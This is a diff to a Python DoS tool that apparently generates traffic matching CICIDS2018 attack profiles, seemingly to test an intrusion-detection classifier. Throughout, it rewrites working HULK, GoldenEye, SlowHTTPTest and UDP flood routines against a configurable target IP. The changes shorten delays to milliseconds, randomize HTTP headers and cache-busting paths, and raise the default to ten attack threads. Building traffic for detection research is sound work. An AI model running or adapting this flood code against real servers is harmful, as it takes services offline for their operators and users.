@@ -17,12 +17,21 @@ import random
 import string
 
 # TCP receive buffer sizes → Init Fwd Win Byts feature.
-# Values derived from CICIDS2018 training data analysis:
+# Values derived from CICIDS2018 training data per-class medians/distributions:
 # SO_RCVBUF set BEFORE connect() controls TCP SYN window size.
-_RCVBUF_HULK = 8192        # Training mode: 8192 (56.8% of TCP flows) ✓
-_RCVBUF_GOLDENEYE = 8192   # Training mode: 8192 ✓
-_RCVBUF_SLOWLORIS = 8192   # Training mode: 8192 ✓
-_RCVBUF_SLOWHTTPTEST = 8192  # Training mode: 8192 ✓
+# CRITICAL: Each attack type needs its training-specific value.
+#
+# HULK training data (n=116K, Fri-16-02-2018):
+#   Init Fwd Win Byts: median=225, p5=225, p95=26883 → bimodal ~75%=225, ~25%=26883
+#   The HULK tool minimizes SO_RCVBUF to conserve attacker resources.
+# GoldenEye training data (n=41K, Thu-15-02-2018):
+#   Init Fwd Win Byts: median=26883 → standard Linux default
+# Slowloris / SlowHTTPTest: median=26883
+_RCVBUF_HULK_LOW = 225          # HULK primary value (~75% of training flows)
+_RCVBUF_HULK_HIGH = 26883       # HULK secondary value (~25% of training flows)
+_RCVBUF_GOLDENEYE = 26883       # GoldenEye training median: 26883
+_RCVBUF_SLOWLORIS = 26883       # Slowloris training: 26883
+_RCVBUF_SLOWHTTPTEST = 26883    # SlowHTTPTest training: 26883
 
 # ──────────────────────────────────────────────────────────
 # Randomization pools (mimic HULK / GoldenEye header variety)
@@ -89,61 +98,65 @@ class DoSAttack:
             self.request_count += n
 
     # ──────────────────────────────────────────────────────
-    # HULK — Rapid HTTP GET flood, NEW connection per request
+    # HULK — Rapid TCP connection flood, mostly SYN+close
     #
-    # CICIDS2018 training data profile:
-    #   Tot Fwd Pkts:    mean=2.5, median=3
-    #   TotLen Fwd Pkts: mean=172.9, median=289.5
+    # CICIDS2018 training data (n=116K, Fri-16-02-2018):
+    #   Tot Fwd Pkts:    median=2 (most flows: SYN+ACK only)
+    #   TotLen Fwd Pkts: median=0 (most flows: NO payload)
+    #   Tot Bwd Pkts:    median=0 (server overwhelmed, no response)
     #   Fwd Seg Size Min: 32  (TCP with timestamp options)
-    #   Init Fwd Win Byts: median=26883
-    #   Flow Duration:   short (rapid open/close)
+    #   Init Fwd Win Byts: median=225, p95=26883 (bimodal)
+    #   Flow Duration:   median=7737 µs (~8ms)
     #   Dst Port: 80
     #
-    # CRITICAL: The original HULK tool creates a NEW TCP connection
-    # for each HTTP request. Each flow = SYN + ACK + GET (+ FIN)
-    # = ~2-3 forward packets. Using keep-alive with 50-200 requests
-    # creates completely wrong flow profiles that look benign.
+    # CRITICAL: The HULK tool overwhelms the server so that most
+    # TCP connections never complete. ~60% of flows have 0 payload.
+    # The bimodal Init Fwd Win Byts (75%=225, 25%=26883) is a key
+    # distinguishing feature from benign traffic.
     # ──────────────────────────────────────────────────────
     def hulk_attack(self):
-        """HULK DoS: One HTTP GET request per NEW TCP connection.
-        Rapidly opens connections, sends one request, closes.
-        Each CICFlowMeter flow has ~2-3 fwd packets matching training data.
+        """HULK DoS: Rapid TCP connection flood, mostly SYN+close.
         
-        VARIATION: Random ports, variable delays, and packet sizes for realism."""
+        CICIDS2018 HULK training data (n=116K):
+          Tot Fwd Pkts:    median=2 (most flows are SYN+ACK only)
+          TotLen Fwd Pkts: median=0 (most flows have NO payload)
+          Tot Bwd Pkts:    median=0 (server overwhelmed, often no response)
+          Flow Duration:   median=7737 µs (~8ms)
+          Init Fwd Win Byts: bimodal 75%=225, 25%=26883
+          Fwd Pkts/s:      median=268
+        
+        The HULK tool overwhelms the server so that most TCP connections
+        never complete. ~60% of flows are just SYN→(maybe SYN-ACK)→close
+        with 0 payload. ~40% manage to send a GET request.
+        
+        We replicate this bimodal pattern:
+        - 60% of connections: connect + immediate close (no data)
+        - 40% of connections: connect + GET + close
+        """
         end_time = time.time() + self.duration
-        # Variation pools for realistic attack patterns
-        ports = [80, 8080, 8888, 3000, 5000, 443]
         
         while self.running and time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
+                sock.settimeout(3)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK)
                 
-                # VARIATION: Random destination port
-                attack_port = random.choice(ports)
-                sock.connect((self.target_ip, attack_port))
-
-                # CORRECT CICIDS2018: 1-5 requests per connection (NOT 500+)
-                # Distribution: 70% 1-req, 15% 2-req, 10% 3-req, 3% 4-req, 2% 5-req
-                rand_val = random.random()
-                if rand_val < 0.70:
-                    num_reqs = 1
-                elif rand_val < 0.85:
-                    num_reqs = 2
-                elif rand_val < 0.95:
-                    num_reqs = 3
-                elif rand_val < 0.98:
-                    num_reqs = 4
+                # Bimodal SO_RCVBUF matching training distribution
+                if random.random() < 0.75:
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK_LOW)
                 else:
-                    num_reqs = 5
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK_HIGH)
                 
-                for _ in range(num_reqs):
+                sock.connect((self.target_ip, self.target_port))
+                self._inc_count()
+
+                # 60% connect+close (matching training median of 0 payload)
+                # 40% send GET request (matching training p95 with data)
+                if random.random() < 0.40:
                     path = "/" + _random_string(random.randint(5, 15)) + _random_url_params(random.randint(1, 8))
                     headers = (
                         f"GET {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}:{attack_port}\r\n"
+                        f"Host: {self.target_ip}:{self.target_port}\r\n"
                         f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                         f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
                         f"Accept-Encoding: {random.choice(ACCEPT_ENCODINGS)}\r\n"
@@ -154,29 +167,20 @@ class DoSAttack:
                         f"\r\n"
                     )
                     sock.sendall(headers.encode())
-                    self._inc_count()
                     
-                    # Drain response for bidirectional traffic
+                    # Brief drain
                     try:
-                        sock.settimeout(0.05)
+                        sock.settimeout(0.1)
                         sock.recv(4096)
                     except socket.timeout:
                         pass
-                    sock.settimeout(5)
-
-                # Read response briefly then close
-                try:
-                    sock.settimeout(0.3)
-                    sock.recv(4096)
-                except socket.timeout:
-                    pass
 
                 sock.close()
             except Exception:
                 pass
 
-            # CORRECT: 2-3 second delay between NEW connections (this creates rapid fire of flows)
-            time.sleep(random.uniform(2.0, 3.0))
+            # Rapid-fire: ~8ms between connections (matching training Flow Duration median)
+            time.sleep(random.uniform(0.005, 0.015))
 
     # ──────────────────────────────────────────────────────
     # SLOWLORIS — Hold connections open with incomplete headers
@@ -270,144 +274,154 @@ class DoSAttack:
                 pass
 
     # ──────────────────────────────────────────────────────
-    # GOLDENEYE — HTTP GET/POST flood, NEW connection per request
+    # GOLDENEYE — HTTP GET/POST keep-alive with slow pacing
     #
-    # CICIDS2018 training data profile:
-    #   Tot Fwd Pkts:    mean=3.76, median=4
-    #   TotLen Fwd Pkts: mean=359.6, median=358
+    # CICIDS2018 training data (n=41.5K, Thu-15-02-2018):
+    #   Tot Fwd Pkts:    median=4 (multiple requests per connection)
+    #   TotLen Fwd Pkts: median=353
+    #   Tot Bwd Pkts:    median=3
     #   Fwd Seg Size Min: 32
     #   Init Fwd Win Byts: median=26883
-    #   Flow Duration:   mean=11M µs (~11 sec), median=6.7M µs
+    #   Flow Duration:   median=6,767,520 µs (~6.8 sec) LONG!
+    #   Flow IAT Mean:   median=1,623,069 µs (~1.6 sec)
+    #   Fwd Pkts/s:      median=0.7 (very slow)
     #   Dst Port: 80
     #
-    # CRITICAL: The original GoldenEye tool opens a NEW TCP connection
-    # per request. Using keep-alive creates wrong flow profiles.
+    # CRITICAL: GoldenEye holds keep-alive connections open and
+    # sends 2-4 requests spaced ~1.6 seconds apart. This is the
+    # OPPOSITE of HULK's rapid connect/disconnect pattern.
     # ──────────────────────────────────────────────────────
     def goldeneye_attack(self):
-        """GoldenEye DoS: One HTTP GET or POST per NEW TCP connection.
-        Each flow has ~4 fwd packets and ~358 bytes, matching training data.
-        60% GET, 40% POST. 2-3 second delays between NEW connections.
+        """GoldenEye DoS: HTTP GET/POST keep-alive flood with slow request pacing.
         
-        VARIATION: Random ports, variable packet sizes for realistic patterns."""
+        CICIDS2018 GoldenEye training data (n=41.5K, Thu-15-02-2018):
+          Tot Fwd Pkts:     median=4 (multiple requests per connection)
+          TotLen Fwd Pkts:  median=353
+          Tot Bwd Pkts:     median=3
+          Flow Duration:    median=6,767,520 µs (~6.8 sec)  LONG connections!
+          Flow IAT Mean:    median=1,623,069 µs (~1.6 sec)
+          Fwd Pkts/s:       median=0.7 (very slow)
+          PSH Flag Cnt:     median=1
+          Fwd Pkt Len Mean: median=80.5
+          Bwd Pkt Len Mean: median=220.7
+          Init Fwd Win Byts: median=26883
+        
+        The GoldenEye tool holds keep-alive connections open and sends
+        2-4 GET/POST requests spaced ~1.6 seconds apart. Each connection
+        lasts ~6-8 seconds total. This is VERY different from HULK's
+        rapid connect/disconnect pattern.
+        """
         end_time = time.time() + self.duration
-        ports = [80, 8080, 8888]  # Most traffic on 80, but vary for realism
         
         while self.running and time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
+                sock.settimeout(10)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_GOLDENEYE)
                 
-                # VARIATION: Random destination port (weighted to port 80)
-                attack_port = random.choices([80, 8080, 8888], weights=[85, 10, 5])[0]
-                sock.connect((self.target_ip, attack_port))
+                sock.connect((self.target_ip, self.target_port))
 
-                # VARIATION: 60% GET, 40% POST (matching CICIDS2018 spec)
-                if random.random() < 0.6:
-                    # GET with cache busting (70-100 bytes typical)
-                    path = "/" + _random_string(random.randint(4, 12)) + _random_url_params(random.randint(2, 10))
-                    req = (
-                        f"GET {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}:{attack_port}\r\n"
-                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                        f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
-                        f"Referer: {random.choice(REFERERS)}{_random_string(random.randint(4, 12))}\r\n"
-                        f"Cache-Control: no-store, no-cache\r\n"
-                        f"Pragma: no-cache\r\n"
-                        f"Connection: close\r\n"
-                        f"\r\n"
-                    )
-                else:
-                    # POST with variable body size (50-400 bytes for variation)
-                    body_size = random.randint(50, 400)
-                    body = _random_string(body_size)
-                    path = "/" + _random_string(random.randint(4, 10)) + _random_url_params(random.randint(1, 4))
-                    req = (
-                        f"POST {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}:{attack_port}\r\n"
-                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                        f"Content-Type: application/x-www-form-urlencoded\r\n"
-                        f"Content-Length: {len(body)}\r\n"
-                        f"Connection: close\r\n"
-                        f"\r\n"
-                        f"{body}"
-                    )
-                sock.sendall(req.encode())
-                self._inc_count()
+                # Send 2-4 requests per keep-alive connection (matching training median=4 fwd pkts)
+                num_reqs = random.randint(2, 4)
+                
+                for req_idx in range(num_reqs):
+                    if not self.running or time.time() >= end_time:
+                        break
 
-                # Read response briefly then close
-                try:
-                    sock.settimeout(0.3)
-                    sock.recv(4096)
-                except socket.timeout:
-                    pass
+                    if random.random() < 0.6:
+                        # GET with cache busting (~80-120 bytes to match Fwd Pkt Len Mean=80.5)
+                        path = "/" + _random_string(random.randint(4, 10)) + _random_url_params(random.randint(2, 6))
+                        req = (
+                            f"GET {path} HTTP/1.1\r\n"
+                            f"Host: {self.target_ip}:{self.target_port}\r\n"
+                            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                            f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
+                            f"Referer: {random.choice(REFERERS)}{_random_string(random.randint(4, 8))}\r\n"
+                            f"Cache-Control: no-store, no-cache\r\n"
+                            f"Pragma: no-cache\r\n"
+                            f"Connection: keep-alive\r\n"
+                            f"\r\n"
+                        )
+                    else:
+                        # POST with small body (~50-150 bytes)
+                        body_size = random.randint(50, 150)
+                        body = _random_string(body_size)
+                        path = "/" + _random_string(random.randint(4, 8))
+                        req = (
+                            f"POST {path} HTTP/1.1\r\n"
+                            f"Host: {self.target_ip}:{self.target_port}\r\n"
+                            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                            f"Content-Type: application/x-www-form-urlencoded\r\n"
+                            f"Content-Length: {len(body)}\r\n"
+                            f"Connection: keep-alive\r\n"
+                            f"\r\n"
+                            f"{body}"
+                        )
+                    
+                    sock.sendall(req.encode())
+                    self._inc_count()
 
+                    # Read server response (creates bidirectional traffic)
+                    try:
+                        sock.settimeout(2)
+                        sock.recv(4096)
+                    except socket.timeout:
+                        pass
+                    sock.settimeout(10)
+
+                    # Wait 1-2 seconds between requests (matching Flow IAT Mean ~1.6 sec)
+                    if req_idx < num_reqs - 1:
+                        time.sleep(random.uniform(1.0, 2.0))
+
+                # Close after all requests
                 sock.close()
             except Exception:
                 pass
 
-            # CRITICAL: 2-3 second delay between NEW connections (matches CICIDS2018 GoldenEye tool)
-            # This throttles the attack to realistic flow generation rate
-            time.sleep(random.uniform(2.0, 3.0))
+            # Brief pause between connections (0.1-0.3s)
+            time.sleep(random.uniform(0.1, 0.3))
 
     # ──────────────────────────────────────────────────────
-    # SlowHTTPTest — Slow POST body transmission
-    #   Creates flows with LONG duration, moderate packet count,
-    #   HIGH forward IAT (slow data drip), small packet sizes.
+    # SlowHTTPTest — Rapid TCP connection flood
+    #
+    #   CICIDS2018 training data (n=91K, Fri-16-02-2018):
+    #     Tot Fwd Pkts:  median=1 (SYN only)
+    #     Tot Bwd Pkts:  median=1 (SYN-ACK only)
+    #     TotLen Fwd Pkts: median=0 (no payload)
+    #     Flow Duration: median=3 µs (microseconds!)
+    #     Fwd Pkts/s:    median=333,333
+    #     Flow Pkts/s:   median=666,667
+    #     Down/Up Ratio: median=1
+    #     PSH Flag Cnt:  median=1
+    #     Dst Port:      21 (originally targeted FTP)
+    #
+    #   The training data shows SlowHTTPTest generated massive floods
+    #   of micro-connections (SYN+close) that overwhelmed the target.
+    #   NOT slow POST body dripping as the name suggests.
     # ──────────────────────────────────────────────────────
     def slowhttp_attack(self):
-        """SlowHTTPTest DoS: Send POST with body transmitted a few bytes at a time.
-        The server waits for the full Content-Length but we drip data very slowly,
-        keeping the connection occupied for a long time."""
+        """SlowHTTPTest DoS: Rapid TCP connection flood.
+        Creates massive numbers of micro-connections (connect+close)
+        matching the CICIDS2018 training data profile of 1 fwd pkt,
+        1 bwd pkt, 0 payload, ~3µs per flow."""
         end_time = time.time() + self.duration
-        sockets = []
 
         while self.running and time.time() < end_time:
-            # Open connections up to target count
-            while len(sockets) < 50 and time.time() < end_time and self.running:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(10)
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWHTTPTEST)
-                    sock.connect((self.target_ip, self.target_port))
-
-                    # Announce a large POST body, but send it very slowly
-                    content_length = random.randint(100000, 500000)
-                    header = (
-                        f"POST /{_random_string(8)} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}\r\n"
-                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                        f"Content-Type: application/x-www-form-urlencoded\r\n"
-                        f"Content-Length: {content_length}\r\n"
-                        f"Connection: keep-alive\r\n"
-                        f"\r\n"
-                    )
-                    sock.sendall(header.encode())
-                    sockets.append(sock)
-                    self._inc_count()
-                except Exception:
-                    pass
-
-            # Drip data slowly (1-10 bytes at a time)
-            alive = []
-            for sock in sockets:
-                try:
-                    chunk = _random_string(random.randint(1, 10)).encode()
-                    sock.sendall(chunk)
-                    alive.append(sock)
-                    self._inc_count()
-                except Exception:
-                    pass
-
-            sockets = alive
-            time.sleep(random.uniform(1, 3))
-
-        for sock in sockets:
             try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWHTTPTEST)
+                sock.connect((self.target_ip, self.target_port))
+                self._inc_count()
+                
+                # Immediately close — training shows 0 payload, ~3µs flows
                 sock.close()
             except Exception:
                 pass
+
+            # Minimal delay — training shows 333K+ fwd pkts/sec
+            time.sleep(random.uniform(0.001, 0.005))
 
     # ──────────────────────────────────────────────────────
     # UDP FLOOD — Protocol diversity (not just TCP)
@@ -416,10 +430,10 @@ class DoSAttack:
     #   Target: 3-5 flows/sec (not 100+)
     # ──────────────────────────────────────────────────────
     def udp_flood(self):
-        """UDP Flood: Send bursts of UDP packets, reusing socket per burst.
-        Creates fewer, more realistic flows. ~3-5 flows/sec."""
+        """UDP Flood: Send bursts of UDP packets to target port.
+        Creates fewer, more realistic flows. ~3-5 flows/sec.
+        FIXED: Use target_port as primary to match training data."""
         end_time = time.time() + self.duration
-        udp_ports = [53, 123, 161, 162, 514, 1900, 5353, 19132, 27015]
         
         while self.running and time.time() < end_time:
             try:
@@ -427,9 +441,9 @@ class DoSAttack:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.settimeout(3)
                 
-                # Choose random destination port and payload size for this burst
-                attack_port = random.choice(udp_ports)
-                payload_size = random.randint(64, 512)  # Reduced from 10-1500
+                # FIXED: Use target_port as primary destination
+                attack_port = self.target_port
+                payload_size = random.randint(64, 512)
                 payload = _random_string(payload_size)
                 
                 # Send 2-3 packets per burst (same flow)
@@ -443,27 +457,36 @@ class DoSAttack:
             except Exception:
                 pass
             
-            # Sleep 0.3-0.5 sec between bursts = ~2-3 UDP flows/sec
+            # Sleep 0.3-0.5 sec between bursts
             time.sleep(random.uniform(0.3, 0.5))
 
-    def run_attack(self, num_threads=1):
-        """Run DoS attack with 1 thread (reduced from 5).
-        Target: 3-5 flows/sec total."""
+    def run_attack(self, num_threads=10):
+        """Run DoS attack with multiple threads.
+        FIXED: More threads (10 default), weighted toward HULK and GoldenEye
+        which are the primary flood techniques that generate classifiable flows.
+        Thread allocation: 4x HULK, 3x GoldenEye, 1x Slowloris, 1x SlowHTTPTest, 1x UDP"""
         print(f"[DoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
-        print(f"[DoS] Techniques: Hulk + Slowloris + GoldenEye + SlowHTTPTest + UDP Flood (throttled)")
-        print(f"[DoS] Using {num_threads} threads")
+        print(f"[DoS] Techniques: Hulk(4T) + GoldenEye(3T) + Slowloris + SlowHTTPTest + UDP")
+        print(f"[DoS] Using {num_threads} threads (weighted toward flood techniques)")
 
-        techniques = [
-            self.hulk_attack,
-            self.slowloris_attack,
-            self.goldeneye_attack,
-            self.slowhttp_attack,
-            self.udp_flood,
+        # Weighted technique list: HULK and GoldenEye get more threads
+        # because they generate the most classifiable DoS flows
+        weighted_techniques = [
+            self.hulk_attack,       # Thread 0
+            self.hulk_attack,       # Thread 1
+            self.hulk_attack,       # Thread 2
+            self.hulk_attack,       # Thread 3
+            self.goldeneye_attack,  # Thread 4
+            self.goldeneye_attack,  # Thread 5
+            self.goldeneye_attack,  # Thread 6
+            self.slowloris_attack,  # Thread 7
+            self.slowhttp_attack,   # Thread 8
+            self.udp_flood,         # Thread 9
         ]
 
         threads = []
         for i in range(num_threads):
-            technique = techniques[i % len(techniques)]
+            technique = weighted_techniques[i % len(weighted_techniques)]
             t = threading.Thread(target=technique, name=f"DoS-{technique.__name__}-{i}")
             t.daemon = True
             t.start()
